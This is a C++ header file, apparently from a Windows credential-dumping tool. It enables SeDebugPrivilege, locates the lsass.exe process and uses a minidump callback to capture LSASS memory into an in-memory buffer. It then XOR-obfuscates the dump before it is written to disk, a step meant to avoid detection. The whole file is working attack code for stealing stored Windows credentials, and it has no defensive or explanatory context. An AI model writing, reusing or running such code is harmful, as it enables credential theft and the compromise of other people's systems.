#pragma once
#include <tchar.h>
#include <TlHelp32.h>


static LPVOID dBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
static DWORD bReadd = 0;


inline bool EnableDebugPrivilege(void) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	// Open the process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cerr << "Failed to open process token\n";
		return false;
	}

	// Lookup the LUID for the SeDebugPrivilege
	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
		std::cerr << "Failed to lookup privilege value\n";
		CloseHandle(hToken);
		return false;
	}

	// Set up token privileges structure
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Adjust the token privileges
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
		std::cerr << "Failed to adjust token privileges\n";
		CloseHandle(hToken);
		return false;
	}

	// Close the token handle
	CloseHandle(hToken);

	return true;
}

inline DWORD getPID(void) {

	DWORD dwLsassPID = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	BOOL bFind = Process32First(hSnap, &pe);
	while (bFind)
	{
		if (_tcscmp(pe.szExeFile, _T("lsass.exe")) == 0)
		{
			dwLsassPID = pe.th32ProcessID;
			break;
		}
		bFind = Process32Next(hSnap, &pe);
	}
	CloseHandle(hSnap);
	return dwLsassPID;
}

inline BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;
		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dBuff + (DWORD_PTR)callbackInput->Io.Offset);
		bufferSize = callbackInput->Io.BufferBytes;
		bReadd += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

inline void Encrypt(void* DumpBuffer, int BytesRead)
{
	// Cast the void pointer to a BYTE pointer for byte-level manipulation
	BYTE* buffer = reinterpret_cast<BYTE*>(DumpBuffer);

	for (int i = 0; i < BytesRead; i++)  // Corrected to avoid off-by-one error
	{
		buffer[i] = buffer[i] ^ 0x9A1C;  // First XOR with 0x9A1C
		buffer[i] = buffer[i] ^ 0x5B9C;  // Second XOR with 0x5B9C
	}
	printf("Successfully encrypted created dump before writing on disk.\n");
}